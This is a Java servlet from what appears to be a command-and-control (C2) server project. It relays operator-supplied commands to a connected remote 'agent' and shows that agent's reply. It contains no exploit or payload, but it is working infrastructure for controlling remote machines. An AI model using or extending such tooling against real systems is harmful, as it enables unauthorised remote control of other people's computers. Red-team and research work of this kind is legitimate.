package com.amtzespinosa.c2server;

import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;

public class CommandServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String agentId = request.getParameter("agentId");
        String command = request.getParameter("command");

        if (agentId == null || agentId.isEmpty()) {
            response.getWriter().println("Error: Agent ID is missing.");
            return;
        }

        if (command == null || command.isEmpty()) {
            response.getWriter().println("Error: Command is missing.");
            return;
        }

        // Get the agent handler
        ClientHandler handler = C2Listener.getAgent(agentId);
        if (handler != null) {
            // Send command and wait for response
            String agentResponse = handler.sendCommand(command);

            // Store response in session so JSP can display it
            request.getSession().setAttribute("lastResponse", agentResponse);

            response.sendRedirect("agent.jsp?id=" + agentId);
        } else {
            response.getWriter().println("[-] Agent not found or disconnected.");
        }
    }
}
